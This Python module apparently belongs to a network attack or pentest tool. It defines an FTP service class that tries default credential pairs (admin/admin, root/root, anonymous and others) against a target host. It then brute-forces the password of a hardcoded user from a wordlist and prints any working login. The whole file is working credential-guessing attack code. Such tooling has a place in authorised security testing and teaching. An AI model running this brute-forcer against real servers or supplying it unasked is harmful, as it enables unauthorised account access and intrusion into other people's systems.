from ipaddress import IPv4Address
from services.service import Service
from colorama import Fore, Style
import ftplib
import sys
import os

class FtpService(Service):
    def __init__(self, ip_addr: IPv4Address, port: int) -> None:
        super().__init__("FTP", ip_addr, port)
        self.wordlist_path = os.path.join(os.path.dirname(__file__), "wordlists", "ftp-wordlist.txt")

    def connect(self, username: str, password: str) -> bool:
        
        try:
            ftp = ftplib.FTP()
            ftp.connect(str(self.ip_addr), self.port, timeout=5)
            ftp.login(username, password)
            ftp.quit()
            return True
        except ftplib.error_perm:
            return False  # Invalid login credentials
        except Exception as e:
            print(f"[FTP ERROR] {e}")
            return False

    def try_login(self) -> bool:
        
        default_credentials = [("admin", "admin"), ("root", "root"), ("ftp", "ftp"), ("anonymous", "anonymous"), ("bipbip", "superpassword")]
        for username, password in default_credentials:
            if self.connect(username, password):
                print(Fore.GREEN + f"[+] Default credentials found: {username}/{password}")
                print(Style.RESET_ALL)
                return True
        return False

    def bruteforce(self) -> bool:
        
        username = "baptiste"  # TODO: Hardcoded for now, ask the user?
        attempt_count = 0

        try:
            with open(self.wordlist_path, "r") as wordlist:
                passwords = wordlist.readlines()
                total_attempts = len(passwords)

                for password in passwords:
                    password = password.strip()
                    attempt_count += 1

                    sys.stdout.write(f"\r[*] Bruteforce Attempts: {attempt_count}/{total_attempts}")
                    sys.stdout.flush()

                    if self.connect(username, password):
                        print(Fore.GREEN + f"\n[+] Brute-force success: {username}/{password}")
                        print(Style.RESET_ALL)
                        return True

            print("\n[-] Brute-force attempt finished, no valid credentials found.")
        except FileNotFoundError:
            print("\n[ERROR] Wordlist file not found at", self.wordlist_path)
        
        return False
